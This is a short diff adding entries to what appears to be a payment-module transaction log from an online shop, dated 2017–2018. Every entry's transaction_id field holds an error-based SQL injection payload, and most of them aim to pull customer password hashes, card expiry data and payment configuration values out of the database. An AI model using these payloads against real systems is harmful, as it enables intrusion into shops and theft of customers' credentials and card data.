@@ -1,0 +1,5 @@
+MB TRANS|17.01.2017 16:01|5.141.9.86|order id not inserted yet|transaction_id:1\' and(select 1 from(select count(*),concat((select customers_password from customers limit 0,1),floor(rand(0)*2))x from customers group by x)a)-- \'|
+MB TRANS|17.01.2017 17:41|83.239.58.162|order id not inserted yet|transaction_id:1\' AND extractvalue(1,concat(0x5C,(select concat_ws(0x3a,cc_expires) from orders where cc_cvv>1 limit 10,1)))--\'
+|
+MB TRANS|23.01.2017 15:43|78.111.40.84|order id not inserted yet|transaction_id:1\' AND extractvalue(1,concat(0x5C,(select concat_ws(0x3a,configuration_value) from configuration where configuration_key=0x4d4f44554c455f5041594d454e545f495041594d454e545f535441545553)))--\'|
+MB TRANS|01.03.2018 21:58|67.236.176.214|order id not inserted yet|transaction_id:1' and(select 1 from(select count(*),concat((select count(*) from orders where shipping_method=0x65626179),floor(rand(0)*2))x from customers group by x)a)-- '|
